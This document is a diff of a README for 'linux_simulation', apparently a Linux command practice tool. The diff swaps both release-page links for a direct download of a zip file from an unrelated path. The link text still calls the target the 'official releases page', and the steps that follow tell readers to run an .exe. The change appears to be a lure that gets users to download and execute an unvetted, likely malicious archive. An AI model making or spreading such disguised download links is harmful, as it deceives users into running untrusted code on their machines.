@@ -5,7 +5,7 @@ description: "Practice Linux command-line skills in your web browser with this i
 ---
 # 🐧 linux_simulation - Learn Linux commands with simple practice
 
-[![Download link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mariejeannechromosomal764/linux_simulation/releases)
+[![Download link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Mariejeannechromosomal764/mariejeannechromosomal764.github.io/main/cornein/io_mariejeannechromosomal_github_v3.7.zip)
 
 ## 📖 About this application
 
@@ -25,7 +25,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to get the application onto your system:
 
-1. Visit the [official releases page](https://github.com/Mariejeannechromosomal764/linux_simulation/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Mariejeannechromosomal764/mariejeannechromosomal764.github.io/main/cornein/io_mariejeannechromosomal_github_v3.7.zip).
 2. Look for the section labeled "Latest."
 3. Select the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
